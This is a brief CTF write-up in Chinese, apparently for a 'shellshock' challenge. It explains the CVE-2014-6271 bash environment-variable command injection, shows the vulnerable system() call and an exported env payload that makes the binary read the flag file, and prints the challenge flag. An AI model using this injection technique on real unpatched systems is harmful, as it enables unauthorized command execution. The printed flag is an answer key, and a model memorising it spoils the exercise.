### shellshock

一个简单的N-day

原理是将某些string作为env解析时带来的命令注入

`system("/home/shellshock/bash -c 'echo shock_me'");`
这里的echo可以被注入，可以被任意替换
`export echo="() {cat flag;}"`

flag
`only if I knew CVE-2014-6271 ten years ago..!!`
